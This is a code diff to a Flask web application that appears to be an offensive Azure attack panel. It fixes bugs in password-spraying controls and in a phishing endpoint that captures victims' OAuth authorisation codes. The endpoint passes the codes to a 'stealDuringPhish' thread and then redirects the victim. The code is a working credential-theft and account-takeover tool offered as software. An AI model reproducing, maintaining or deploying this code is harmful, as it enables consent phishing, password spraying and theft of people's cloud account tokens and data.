@@ -307,12 +307,12 @@ def sprayingStart(action):
     if action == "stop":
         attack_status = AttackStatus.query.filter_by(uuid=current_user.id).first()
         attack_status.spraying = "False"
-        db.session.commit
-        db.engine.execute(text("UPDATE attack_status SET spraying ='False' WHERE uuid = :uuid"), uuid=current_user.id)
+        db.session.commit()
+        #db.engine.execute(text("UPDATE attack_status SET spraying ='False' WHERE uuid = :uuid"), uuid=current_user.id)
         try:
             ps.kill()
             ps.join()
-        except:    
+        except:
             pass
 
     flash(["Spraying", "Spraying started in the background"], "success")   
@@ -446,7 +446,7 @@ def visitors():
     visitors = Visitors.query.with_entities(Visitors.ip, Visitors.time).filter_by(uuid=current_user.id).distinct()
     return render_template("azure/visitors.html", visitors=visitors)
 
-@app.route("/azure/getcode/<uuid>", methods=['GET', 'POST'])
+@app.route("/azure/getcode/<uuid>")
 def getcode(uuid):
     try:
         adminUser = Admin.query.filter_by(id=uuid).first()
@@ -470,10 +470,11 @@ def getcode(uuid):
         code = flask.request.args['code']
         threading.Thread(target=stealDuringPhish, name="stealer", args=(uuid, code)).start()
         redirect_after_stealing = StealerConfig.query.with_entities(StealerConfig.redirect_after_stealing).filter_by(uuid=uuid).first().redirect_after_stealing
-        if redirect_after_stealing != None or redirect_after_stealing != "":
+        if "http" in redirect_after_stealing:
+            print(redirect_after_stealing)
             return redirect(redirect_after_stealing)
         else:
-            return redirect(url_for(getcode))
+            return redirect(f"/azure/getcode/{current_user.id}")
     try:
         url = StealerConfig.query.filter_by(uuid=uuid).first().phishUrl
     except:
@@ -894,7 +895,7 @@ def command(log):
 
     if log['type'] == "specificAttackStorageLog":
         while True:
-            phishlogs = subdomainLogs.query.filter_by(uuid=current_user.id).order_by(subdomainLogs.temp.desc()).all()
+            phishlogs = specificAttackStorageLogs.query.filter_by(uuid=current_user.id).order_by(specificAttackStorageLogs.temp.desc()).all()
             logs = []
             for data in phishlogs:
                 logs.append(data.message)
